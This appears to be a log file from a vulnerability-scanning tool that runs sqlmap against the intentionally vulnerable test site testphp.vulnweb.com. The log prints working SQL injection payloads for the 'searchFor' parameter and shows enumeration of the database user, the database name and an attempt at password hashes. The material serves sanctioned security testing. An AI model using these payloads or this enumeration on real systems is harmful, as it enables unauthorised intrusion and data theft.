@@ -1,0 +1,575 @@
+[2026-01-06 21:51:24] [*] Starting QUICK SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-01-06 21:51:24] [*] Starting QUICK scan (Detection) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-01-06 21:51:24] [*] Executing SQLMap...
+[2026-01-06 21:51:33] [SQLMap] ___
+[2026-01-06 21:51:33] [SQLMap] __H__
+[2026-01-06 21:51:33] [SQLMap] ___ ___[)]_____ ___ ___  {1.10.1.12#dev}
+[2026-01-06 21:51:33] [SQLMap] |_ -| . [,]     | .'| . |
+[2026-01-06 21:51:33] [SQLMap] |___|_  [']_|_|_|__,|  _|
+[2026-01-06 21:51:33] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-06 21:51:33] [SQLMap] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-01-06 21:51:33] [SQLMap] [*] starting @ 21:51:33 /2026-01-06/
+[2026-01-06 21:51:34] [SQLMap] [21:51:34] [WARNING] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner' as the output directory
+[2026-01-06 21:51:34] [DATA] [21:51:34] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-01-06 21:51:34] [SQLMap] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-01-06 21:51:34] [SQLMap] [21:51:34] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-06 21:51:34] [SQLMap] [21:51:34] [INFO] searching for links with depth 1
+[2026-01-06 21:51:35] [SQLMap] [21:51:35] [INFO] searching for links with depth 2
+[2026-01-06 21:51:35] [SQLMap] please enter number of threads? [Enter for 1 (current)] 1
+[2026-01-06 21:51:35] [SQLMap] [21:51:35] [WARNING] running in a single-thread mode. This could take a while
+[2026-01-06 21:51:36] [SQLMap] do you want to normalize crawling results [Y/n] Y
+[2026-01-06 21:51:36] [SQLMap] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-01-06 21:51:46] [SQLMap] [21:51:46] [INFO] found a total of 3 targets
+[2026-01-06 21:51:46] [SQLMap] [1/3] Form:
+[2026-01-06 21:51:46] [SQLMap] POST http://testphp.vulnweb.com/search.php?test=query
+[2026-01-06 21:51:46] [SQLMap] POST data: searchFor=&goButton=go
+[2026-01-06 21:51:46] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-06 21:51:46] [SQLMap] > Y
+[2026-01-06 21:51:46] [SQLMap] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
+[2026-01-06 21:51:46] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-06 21:51:46] [SQLMap] [21:51:46] [INFO] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01062026_0951pm.csv' as the CSV results file in multiple targets mode
+[2026-01-06 21:51:46] [SQLMap] [21:51:46] [INFO] checking if the target is protected by some kind of WAF/IPS
+[2026-01-06 21:51:46] [SQLMap] [21:51:46] [INFO] testing if the target URL content is stable
+[2026-01-06 21:51:47] [SQLMap] [21:51:47] [INFO] target URL content is stable
+[2026-01-06 21:51:47] [SQLMap] [21:51:47] [INFO] testing if POST parameter 'searchFor' is dynamic
+[2026-01-06 21:51:47] [SQLMap] [21:51:47] [WARNING] POST parameter 'searchFor' does not appear to be dynamic
+[2026-01-06 21:51:48] [SQLMap] [21:51:48] [INFO] heuristic (basic) test shows that POST parameter 'searchFor' might be injectable (possible DBMS: 'MySQL')
+[2026-01-06 21:51:48] [DATA] [21:51:48] [INFO] heuristic (XSS) test shows that POST parameter 'searchFor' might be vulnerable to cross-site scripting (XSS) attacks
+[2026-01-06 21:51:48] [SQLMap] [21:51:48] [INFO] testing for SQL injection on POST parameter 'searchFor'
+[2026-01-06 21:51:48] [SQLMap] it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[2026-01-06 21:51:48] [SQLMap] for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[2026-01-06 21:51:48] [SQLMap] [21:51:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[2026-01-06 21:51:50] [SQLMap] [21:51:50] [WARNING] reflective value(s) found and filtering out
+[2026-01-06 21:51:54] [SQLMap] [21:51:54] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[2026-01-06 21:51:55] [SQLMap] [21:51:55] [INFO] testing 'Generic inline queries'
+[2026-01-06 21:51:55] [SQLMap] [21:51:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[2026-01-06 21:52:09] [SQLMap] [21:52:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
+[2026-01-06 21:52:21] [SQLMap] [21:52:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
+[2026-01-06 21:52:34] [SQLMap] [21:52:34] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[2026-01-06 21:52:57] [SQLMap] [21:52:57] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[2026-01-06 21:53:23] [SQLMap] [21:53:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
+[2026-01-06 21:53:46] [SQLMap] [21:53:46] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[2026-01-06 21:54:15] [SQLMap] [21:54:15] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
+[2026-01-06 21:54:36] [SQLMap] [21:54:36] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[2026-01-06 21:54:41] [SQLMap] [21:54:41] [INFO] POST parameter 'searchFor' appears to be 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable (with --string="Our")
+[2026-01-06 21:54:41] [SQLMap] [21:54:41] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[2026-01-06 21:54:41] [SQLMap] [21:54:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[2026-01-06 21:54:42] [SQLMap] [21:54:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[2026-01-06 21:54:42] [SQLMap] [21:54:42] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[2026-01-06 21:54:43] [SQLMap] [21:54:43] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[2026-01-06 21:54:43] [SQLMap] [21:54:43] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[2026-01-06 21:54:43] [SQLMap] [21:54:43] [INFO] POST parameter 'searchFor' is 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' injectable
+[2026-01-06 21:54:43] [SQLMap] [21:54:43] [INFO] testing 'MySQL inline queries'
+[2026-01-06 21:54:43] [SQLMap] [21:54:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[2026-01-06 21:54:44] [SQLMap] [21:54:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[2026-01-06 21:54:44] [SQLMap] [21:54:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[2026-01-06 21:54:44] [SQLMap] [21:54:44] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[2026-01-06 21:54:45] [SQLMap] [21:54:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+[2026-01-06 21:54:45] [SQLMap] [21:54:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+[2026-01-06 21:54:45] [SQLMap] [21:54:45] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[2026-01-06 21:55:02] [SQLMap] [21:55:02] [INFO] POST parameter 'searchFor' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+[2026-01-06 21:55:02] [SQLMap] [21:55:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[2026-01-06 21:55:02] [SQLMap] [21:55:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[2026-01-06 21:55:38] [SQLMap] [21:55:38] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[2026-01-06 21:55:46] [SQLMap] [21:55:46] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
+[2026-01-06 21:55:54] [SQLMap] [21:55:54] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
+[2026-01-06 21:56:02] [SQLMap] [21:56:02] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
+[2026-01-06 21:56:35] [SQLMap] [21:56:35] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[2026-01-06 21:56:43] [SQLMap] [21:56:43] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
+[2026-01-06 21:56:50] [SQLMap] [21:56:50] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
+[2026-01-06 21:56:57] [SQLMap] [21:56:57] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
+[2026-01-06 21:57:04] [SQLMap] [21:57:04] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
+[2026-01-06 21:57:11] [SQLMap] [21:57:11] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
+[2026-01-06 21:57:18] [SQLMap] [21:57:18] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
+[2026-01-06 21:57:26] [DATA] POST parameter 'searchFor' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[2026-01-06 21:57:26] [SQLMap] sqlmap identified the following injection point(s) with a total of 771 HTTP(s) requests:
+[2026-01-06 21:57:26] [SQLMap] ---
+[2026-01-06 21:57:26] [SQLMap] Parameter: searchFor (POST)
+[2026-01-06 21:57:26] [SQLMap] Type: boolean-based blind
+[2026-01-06 21:57:26] [SQLMap] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+[2026-01-06 21:57:26] [SQLMap] Payload: searchFor=Ukxa' AND EXTRACTVALUE(7498,CASE WHEN (7498=7498) THEN 7498 ELSE 0x3A END) AND 'VeRE'='VeRE&goButton=go
+[2026-01-06 21:57:26] [SQLMap] Type: error-based
+[2026-01-06 21:57:26] [SQLMap] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+[2026-01-06 21:57:26] [SQLMap] Payload: searchFor=Ukxa' OR GTID_SUBSET(CONCAT(0x7171786b71,(SELECT (ELT(1342=1342,1))),0x716a6b7a71),1342) AND 'sSGK'='sSGK&goButton=go
+[2026-01-06 21:57:26] [SQLMap] Type: time-based blind
+[2026-01-06 21:57:26] [SQLMap] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+[2026-01-06 21:57:26] [SQLMap] Payload: searchFor=Ukxa' AND (SELECT 4834 FROM (SELECT(SLEEP(5)))TXdc) AND 'HiXS'='HiXS&goButton=go
+[2026-01-06 21:57:26] [SQLMap] ---
+[2026-01-06 21:57:26] [SQLMap] do you want to exploit this SQL injection? [Y/n] Y
+[2026-01-06 21:57:26] [SQLMap] [21:57:26] [INFO] the back-end DBMS is MySQL
+[2026-01-06 21:57:26] [SQLMap] [21:57:26] [INFO] fetching banner
+[2026-01-06 21:57:27] [SQLMap] [21:57:27] [INFO] retrieved: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-06 21:57:29] [SQLMap] web server operating system: Linux Ubuntu
+[2026-01-06 21:57:29] [SQLMap] web application technology: Nginx 1.19.0, PHP 5.6.40
+[2026-01-06 21:57:29] [SQLMap] back-end DBMS operating system: Linux Ubuntu
+[2026-01-06 21:57:29] [SQLMap] back-end DBMS: MySQL >= 5.6
+[2026-01-06 21:57:29] [SQLMap] banner: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-06 21:57:29] [SQLMap] [21:57:29] [INFO] fetching current user
+[2026-01-06 21:57:29] [SQLMap] [21:57:29] [INFO] retrieved: 'acuart@localhost'
+[2026-01-06 21:57:29] [SQLMap] current user: 'acuart@localhost'
+[2026-01-06 21:57:29] [SQLMap] [21:57:29] [INFO] fetching current database
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [INFO] retrieved: 'acuart'
+[2026-01-06 21:57:30] [SQLMap] current database: 'acuart'
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [INFO] testing if current user is DBA
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [INFO] fetching current user
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [WARNING] potential permission problems detected ('command denied')
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[2026-01-06 21:57:30] [SQLMap] current user is DBA: False
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [WARNING] HTTP error codes detected during run:
+[2026-01-06 21:57:30] [SQLMap] 500 (Internal Server Error) - 7 times
+[2026-01-06 21:57:30] [SQLMap] SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [INFO] skipping 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [INFO] skipping 'http://testphp.vulnweb.com/hpp/?pp=12'
+[2026-01-06 21:57:30] [SQLMap] [21:57:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01062026_0951pm.csv'
+[2026-01-06 21:57:30] [+] Scan Completed. Parsing results...
+[2026-01-06 21:57:30] [+] Parsed 0 vulnerabilities from log.
+[2026-01-06 21:57:30] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-01-06 21:57:30] [+] SQL scan complete. Generating PDF report...
+[2026-01-06 21:57:32] [+] PDF report generated successfully: D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.pdf
+[2026-01-06 22:02:41] [*] Starting QUICK SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-01-06 22:02:41] [*] Starting QUICK scan (Detection) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-01-06 22:02:41] [*] Executing SQLMap...
+[2026-01-06 22:02:42] [SQLMap] ___
+[2026-01-06 22:02:42] [SQLMap] __H__
+[2026-01-06 22:02:42] [SQLMap] ___ ___[.]_____ ___ ___  {1.10.1.12#dev}
+[2026-01-06 22:02:42] [SQLMap] |_ -| . ["]     | .'| . |
+[2026-01-06 22:02:42] [SQLMap] |___|_  ["]_|_|_|__,|  _|
+[2026-01-06 22:02:42] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-06 22:02:42] [SQLMap] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-01-06 22:02:42] [SQLMap] [*] starting @ 22:02:42 /2026-01-06/
+[2026-01-06 22:02:42] [SQLMap] [22:02:42] [WARNING] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner' as the output directory
+[2026-01-06 22:02:42] [DATA] [22:02:42] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:143.0) Gecko/20100101 Firefox/143.0' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-01-06 22:02:42] [SQLMap] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-01-06 22:02:42] [SQLMap] [22:02:42] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-06 22:02:42] [SQLMap] [22:02:42] [INFO] searching for links with depth 1
+[2026-01-06 22:02:43] [SQLMap] [22:02:43] [INFO] searching for links with depth 2
+[2026-01-06 22:02:43] [SQLMap] please enter number of threads? [Enter for 1 (current)] 1
+[2026-01-06 22:02:43] [SQLMap] [22:02:43] [WARNING] running in a single-thread mode. This could take a while
+[2026-01-06 22:02:44] [SQLMap] do you want to normalize crawling results [Y/n] Y
+[2026-01-06 22:02:44] [SQLMap] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] found a total of 3 targets
+[2026-01-06 22:02:45] [SQLMap] [1/3] Form:
+[2026-01-06 22:02:45] [SQLMap] POST http://testphp.vulnweb.com/search.php?test=query
+[2026-01-06 22:02:45] [SQLMap] POST data: searchFor=&goButton=go
+[2026-01-06 22:02:45] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-06 22:02:45] [SQLMap] > Y
+[2026-01-06 22:02:45] [SQLMap] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
+[2026-01-06 22:02:45] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] resuming back-end DBMS 'mysql'
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01062026_1002pm.csv' as the CSV results file in multiple targets mode
+[2026-01-06 22:02:45] [SQLMap] sqlmap resumed the following injection point(s) from stored session:
+[2026-01-06 22:02:45] [SQLMap] ---
+[2026-01-06 22:02:45] [SQLMap] Parameter: searchFor (POST)
+[2026-01-06 22:02:45] [SQLMap] Type: boolean-based blind
+[2026-01-06 22:02:45] [SQLMap] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+[2026-01-06 22:02:45] [SQLMap] Payload: searchFor=Ukxa' AND EXTRACTVALUE(7498,CASE WHEN (7498=7498) THEN 7498 ELSE 0x3A END) AND 'VeRE'='VeRE&goButton=go
+[2026-01-06 22:02:45] [SQLMap] Type: error-based
+[2026-01-06 22:02:45] [SQLMap] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+[2026-01-06 22:02:45] [SQLMap] Payload: searchFor=Ukxa' OR GTID_SUBSET(CONCAT(0x7171786b71,(SELECT (ELT(1342=1342,1))),0x716a6b7a71),1342) AND 'sSGK'='sSGK&goButton=go
+[2026-01-06 22:02:45] [SQLMap] Type: time-based blind
+[2026-01-06 22:02:45] [SQLMap] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+[2026-01-06 22:02:45] [SQLMap] Payload: searchFor=Ukxa' AND (SELECT 4834 FROM (SELECT(SLEEP(5)))TXdc) AND 'HiXS'='HiXS&goButton=go
+[2026-01-06 22:02:45] [SQLMap] ---
+[2026-01-06 22:02:45] [SQLMap] do you want to exploit this SQL injection? [Y/n] Y
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] the back-end DBMS is MySQL
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] fetching banner
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] resumed: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-06 22:02:45] [SQLMap] web server operating system: Linux Ubuntu
+[2026-01-06 22:02:45] [SQLMap] web application technology: Nginx 1.19.0, PHP 5.6.40
+[2026-01-06 22:02:45] [SQLMap] back-end DBMS operating system: Linux Ubuntu
+[2026-01-06 22:02:45] [SQLMap] back-end DBMS: MySQL >= 5.6
+[2026-01-06 22:02:45] [SQLMap] banner: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] fetching current user
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] resumed: 'acuart@localhost'
+[2026-01-06 22:02:45] [SQLMap] current user: 'acuart@localhost'
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] fetching current database
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] resumed: 'acuart'
+[2026-01-06 22:02:45] [SQLMap] current database: 'acuart'
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] testing if current user is DBA
+[2026-01-06 22:02:45] [SQLMap] [22:02:45] [INFO] fetching current user
+[2026-01-06 22:02:46] [SQLMap] [22:02:46] [WARNING] reflective value(s) found and filtering out
+[2026-01-06 22:02:46] [SQLMap] [22:02:46] [WARNING] potential permission problems detected ('command denied')
+[2026-01-06 22:02:46] [SQLMap] [22:02:46] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[2026-01-06 22:02:46] [SQLMap] current user is DBA: False
+[2026-01-06 22:02:46] [SQLMap] SQL injection vulnerability has already been detected against 'testphp.vulnweb.com'. Do you want to skip further tests involving it? [Y/n] Y
+[2026-01-06 22:02:46] [SQLMap] [22:02:46] [INFO] skipping 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-06 22:02:46] [SQLMap] [22:02:46] [INFO] skipping 'http://testphp.vulnweb.com/hpp/?pp=12'
+[2026-01-06 22:02:46] [SQLMap] [22:02:46] [INFO] you can find results of scanning in multiple targets mode inside the CSV file 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01062026_1002pm.csv'
+[2026-01-06 22:02:46] [+] Scan Completed. Parsing results...
+[2026-01-06 22:02:46] [+] Parsed 5 vulnerabilities from log.
+[2026-01-06 22:02:46] [+] SQL JSON report saved to D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.json
+[2026-01-06 22:02:46] [+] SQL scan complete. Generating PDF report...
+[2026-01-06 22:02:48] [+] PDF report generated successfully: D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\sql_report.pdf
+[2026-01-07 14:57:18] [*] Starting FULL SQL scan for http://testphp.vulnweb.com/artists.php?artist=1 (User: DivyaViradiya_1)...
+[2026-01-07 14:57:18] [*] Starting FULL scan (Detection + Enumeration) on http://testphp.vulnweb.com/artists.php?artist=1
+[2026-01-07 14:57:18] [*] Executing SQLMap...
+[2026-01-07 14:57:20] [SQLMap] ___
+[2026-01-07 14:57:20] [SQLMap] __H__
+[2026-01-07 14:57:20] [SQLMap] ___ ___[(]_____ ___ ___  {1.10.1.12#dev}
+[2026-01-07 14:57:20] [SQLMap] |_ -| . [(]     | .'| . |
+[2026-01-07 14:57:20] [SQLMap] |___|_  [)]_|_|_|__,|  _|
+[2026-01-07 14:57:20] [SQLMap] |_|V...       |_|   https://sqlmap.org
+[2026-01-07 14:57:20] [SQLMap] [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+[2026-01-07 14:57:20] [SQLMap] [*] starting @ 14:57:20 /2026-01-07/
+[2026-01-07 14:57:20] [SQLMap] [14:57:20] [WARNING] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner' as the output directory
+[2026-01-07 14:57:20] [DATA] [14:57:20] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15' from file 'D:\SQLmap_setup\data\txt\user-agents.txt'
+[2026-01-07 14:57:20] [SQLMap] do you want to check for the existence of site's sitemap(.xml) [y/N] N
+[2026-01-07 14:57:20] [SQLMap] [14:57:20] [INFO] starting crawler for target URL 'http://testphp.vulnweb.com/artists.php?artist=1'
+[2026-01-07 14:57:20] [SQLMap] [14:57:20] [INFO] searching for links with depth 1
+[2026-01-07 14:57:21] [SQLMap] [14:57:21] [INFO] searching for links with depth 2
+[2026-01-07 14:57:21] [SQLMap] please enter number of threads? [Enter for 1 (current)] 1
+[2026-01-07 14:57:21] [SQLMap] [14:57:21] [WARNING] running in a single-thread mode. This could take a while
+[2026-01-07 14:57:22] [SQLMap] do you want to normalize crawling results [Y/n] Y
+[2026-01-07 14:57:22] [SQLMap] do you want to store crawling results to a temporary file for eventual further processing with other tools [y/N] N
+[2026-01-07 14:57:24] [SQLMap] [14:57:24] [INFO] found a total of 3 targets
+[2026-01-07 14:57:24] [SQLMap] [1/3] Form:
+[2026-01-07 14:57:24] [SQLMap] POST http://testphp.vulnweb.com/search.php?test=query
+[2026-01-07 14:57:24] [SQLMap] POST data: searchFor=&goButton=go
+[2026-01-07 14:57:24] [SQLMap] do you want to test this form? [Y/n/q]
+[2026-01-07 14:57:24] [SQLMap] > Y
+[2026-01-07 14:57:24] [SQLMap] Edit POST data [default: searchFor=&goButton=go] (Warning: blank fields detected): searchFor=&goButton=go
+[2026-01-07 14:57:24] [SQLMap] do you want to fill blank fields with random values? [Y/n] Y
+[2026-01-07 14:57:24] [SQLMap] [14:57:24] [INFO] resuming back-end DBMS 'mysql'
+[2026-01-07 14:57:24] [SQLMap] [14:57:24] [INFO] using 'D:\NetShieldAI\Services\results\DivyaViradiya_1\sql_scanner\results-01072026_0257pm.csv' as the CSV results file in multiple targets mode
+[2026-01-07 14:57:25] [SQLMap] sqlmap resumed the following injection point(s) from stored session:
+[2026-01-07 14:57:25] [SQLMap] ---
+[2026-01-07 14:57:25] [SQLMap] Parameter: searchFor (POST)
+[2026-01-07 14:57:25] [SQLMap] Type: boolean-based blind
+[2026-01-07 14:57:25] [SQLMap] Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+[2026-01-07 14:57:25] [SQLMap] Payload: searchFor=Ukxa' AND EXTRACTVALUE(7498,CASE WHEN (7498=7498) THEN 7498 ELSE 0x3A END) AND 'VeRE'='VeRE&goButton=go
+[2026-01-07 14:57:25] [SQLMap] Type: error-based
+[2026-01-07 14:57:25] [SQLMap] Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
+[2026-01-07 14:57:25] [SQLMap] Payload: searchFor=Ukxa' OR GTID_SUBSET(CONCAT(0x7171786b71,(SELECT (ELT(1342=1342,1))),0x716a6b7a71),1342) AND 'sSGK'='sSGK&goButton=go
+[2026-01-07 14:57:25] [SQLMap] Type: time-based blind
+[2026-01-07 14:57:25] [SQLMap] Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+[2026-01-07 14:57:25] [SQLMap] Payload: searchFor=Ukxa' AND (SELECT 4834 FROM (SELECT(SLEEP(5)))TXdc) AND 'HiXS'='HiXS&goButton=go
+[2026-01-07 14:57:25] [SQLMap] ---
+[2026-01-07 14:57:25] [SQLMap] do you want to exploit this SQL injection? [Y/n] Y
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] the back-end DBMS is MySQL
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] fetching banner
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] resumed: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-07 14:57:25] [SQLMap] web server operating system: Linux Ubuntu
+[2026-01-07 14:57:25] [SQLMap] web application technology: PHP 5.6.40, Nginx 1.19.0
+[2026-01-07 14:57:25] [SQLMap] back-end DBMS operating system: Linux Ubuntu
+[2026-01-07 14:57:25] [SQLMap] back-end DBMS: MySQL >= 5.6
+[2026-01-07 14:57:25] [SQLMap] banner: '8.0.22-0ubuntu0.20.04.2'
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] fetching current user
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] resumed: 'acuart@localhost'
+[2026-01-07 14:57:25] [SQLMap] current user: 'acuart@localhost'
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] fetching current database
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] resumed: 'acuart'
+[2026-01-07 14:57:25] [SQLMap] current database: 'acuart'
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] testing if current user is DBA
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] fetching current user
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [WARNING] reflective value(s) found and filtering out
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [WARNING] potential permission problems detected ('command denied')
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[2026-01-07 14:57:25] [SQLMap] current user is DBA: False
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [INFO] fetching database users password hashes
+[2026-01-07 14:57:25] [SQLMap] [14:57:25] [WARNING] the SQL query provided does not return any output
